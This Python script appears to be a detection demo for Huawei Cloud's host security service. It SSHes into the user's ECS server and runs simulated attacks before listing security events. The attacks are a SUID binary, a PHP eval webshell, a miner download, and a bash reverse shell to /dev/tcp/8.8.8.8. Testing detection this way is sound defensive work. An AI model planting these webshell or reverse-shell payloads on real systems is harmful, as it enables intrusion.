#!/usr/bin/env python3
"""HSS Demo：在真实 ECS 上触发危险命令并查询 HSS 检出。"""
import json
import os
import sys
import time

SKILL_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
sys.path.insert(0, SKILL_ROOT)

from lib.common import load_config, hss_client, ssh_exec
from huaweicloudsdkhss.v5 import ListSecurityEventsRequest

COMMANDS = [
    ("提权（SUID）", 'f=/usr/bin/demo_$(date +%s%N); cp /bin/true "$f" && chmod u+s "$f" && echo "created $f"'),
    ("Webshell 写入", 'f=/tmp/shell_$(date +%s%N).php; echo "<?php @eval(\\$_POST[c]);?>" > "$f" && echo "created $f"'),
    ("挖矿木马下载", 'f=/tmp/xmrig_$(date +%s%N); curl -s http://127.0.0.1/xmrig -o "$f"; chmod +x "$f"; echo "created $f"'),
    ("反弹 Shell", 'timeout 5 bash -c "bash -i >& /dev/tcp/8.8.8.8/53 0>&1" 2>/dev/null; echo triggered'),
]


def main():
    cfg = load_config()
    st = json.load(open(os.path.join(SKILL_ROOT, "state.json"), encoding="utf-8"))
    pw = open(os.path.join(SKILL_ROOT, "demo_password.txt")).read().strip()
    cli = hss_client(cfg)

    for name, cmd in COMMANDS:
        print(f"▶ 触发【{name}】")
        print("  ", ssh_exec(st["public_ip"], pw, cmd))

    print("\n等待 HSS 检出（30–90 秒）…")
    time.sleep(60)
    r = cli.list_security_events(ListSecurityEventsRequest(host_id=st["server_id"], limit=50))
    print(f"\n安全事件总数: {r.total_num}")
    for ev in (r.data_list or []):
        print("  -", getattr(ev, "event_name", None), "|", getattr(ev, "severity", None))


if __name__ == "__main__":
    main()
